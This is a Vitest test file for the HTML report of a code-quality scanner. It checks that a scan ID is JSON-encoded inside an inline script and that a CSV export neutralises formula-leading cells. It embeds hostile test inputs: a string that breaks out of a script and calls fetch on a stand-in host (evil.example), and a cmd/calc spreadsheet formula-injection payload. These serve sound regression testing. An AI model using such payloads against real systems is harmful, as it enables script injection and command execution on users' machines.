import { describe, it, expect } from "vitest";
import { renderHtmlReport } from "../../../src/output/html.js";
import type { ScanResult } from "../../../src/core/types.js";

function minimalScanResult(overrides?: Partial<ScanResult>): ScanResult {
  const emptyCat = { score: 18, maxScore: 20, locked: false, findingCount: 0, applicable: true };
  return {
    context: {
      rootDir: "/tmp/proj",
      dominantLanguage: "typescript",
      languageBreakdown: new Map(),
      totalLines: 1000,
      files: [{}],
      intentHints: [],
    },
    compositeScore: 84,
    maxCompositeScore: 100,
    percentile: null,
    peerLanguage: "typescript",
    scores: {
      architecturalConsistency: { ...emptyCat },
      redundancy: { ...emptyCat },
      dependencyHealth: { ...emptyCat },
      securityPosture: { ...emptyCat },
      intentClarity: { ...emptyCat },
    },
    hygieneScore: 42.7,
    maxHygieneScore: 100,
    hygieneScores: {
      architecturalConsistency: { ...emptyCat },
      redundancy: { ...emptyCat },
      dependencyHealth: { ...emptyCat },
      securityPosture: { ...emptyCat },
      intentClarity: { ...emptyCat },
    },
    findings: [],
    driftFindings: [],
    driftScores: {},
    perFileScores: new Map(),
    teaseMessages: [],
    deepInsights: [],
    scanTimeMs: 5,
    ...overrides,
  } as unknown as ScanResult;
}

/**
 * P3: opts.scanId (and the beaconApiUrl string build) were spliced raw into
 * an inline `<script>` JS string via template-literal interpolation, unlike
 * every other dynamic value in this file which goes through esc()/JSON
 * encoding. A scanId containing a quote or backslash would break out of the
 * JS string literal it's embedded in. The fix wraps both in JSON.stringify.
 */
describe("html report — scanId is JSON-encoded into the beacon script, not spliced raw", () => {
  it("a scanId containing a double quote does not break out of the JS string literal", () => {
    const malicious = `abc"});fetch("https://evil.example/x`;
    const html = renderHtmlReport(minimalScanResult(), "summary", {}, { scanId: malicious, isPaid: false });
    // The JSON-encoded form must appear (quotes escaped) — this is what
    // JSON.stringify(malicious) produces.
    expect(html).toContain(JSON.stringify(malicious));
    // The raw, unescaped payload must never appear verbatim inside the script.
    expect(html).not.toContain(`scan_id:"${malicious}"`);
  });

  it("beaconApiUrl is also JSON-encoded, not string-concatenated raw", () => {
    const html = renderHtmlReport(minimalScanResult(), "summary", {}, { scanId: "scan_123", beaconApiUrl: "https://api.example.com", isPaid: false });
    expect(html).toContain(JSON.stringify("https://api.example.com/v1/beacon/report-open"));
  });

  it("omits the beacon entirely (and thus stays safe) when no scanId is provided", () => {
    const html = renderHtmlReport(minimalScanResult(), "summary", {}, { isPaid: false });
    expect(html).not.toContain("report-open");
  });
});

/**
 * P0 (client-side twin of csv.ts's csvEscape): the "Export CSV" button's
 * embedded q() helper builds a CSV client-side from window.__VIBEDRIFT_DATA.
 * It escaped quotes/commas/newlines but not formula-leading characters, so
 * the same CWE-1236 formula-injection risk applied to the in-browser export.
 */
describe("html report — client-side CSV export q() helper neutralizes formula-leading cells", () => {
  it("ships a q() that single-quote-prefixes a leading = + - @ tab or CR before wrapping", () => {
    const html = renderHtmlReport(minimalScanResult(), "detailed", {}, { isPaid: false });
    const match = html.match(/var q=function\(v\)\{[\s\S]*?\};/);
    expect(match).not.toBeNull();
    const qSource = match![0];

    // Extract and execute the function body in isolation to assert behavior,
    // rather than just eyeballing the regex — this is a real regression test
    // against the shipped script text.
    const q = new Function(`${qSource}\nreturn q;`)() as (v: unknown) => string;

    expect(q("=cmd|' /C calc'!A0")).toBe("'=cmd|' /C calc'!A0");
    expect(q("+1+1")).toBe("'+1+1");
    expect(q("-1+1")).toBe("'-1+1");
    expect(q("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(q("normal value")).toBe("normal value");
    // Still quote-wraps on comma, same as before.
    expect(q("a,b")).toBe('"a,b"');
  });
});

/**
 * P2: the Hygiene Score scalar ("Hygiene Score: NN/MM") that terminal output
 * shows was absent from the HTML report entirely — buildHygiene() rendered
 * only the "not part of your Vibe Drift Score" note with no number.
 */
describe("html report — Hygiene section surfaces the hygieneScore/maxHygieneScore scalar", () => {
  it("shows the hygiene score next to the hygiene findings", () => {
    const hygieneFinding = {
      analyzerId: "complexity",
      severity: "warning" as const,
      confidence: 0.7,
      message: "Function exceeds complexity threshold",
      locations: [{ file: "src/big.ts", line: 10 }],
      tags: [],
    };
    const html = renderHtmlReport(
      minimalScanResult({ findings: [hygieneFinding] }),
      "detailed",
      {},
      { isPaid: false },
    );
    expect(html).toContain("Hygiene Score: 42.7/100");
  });
});
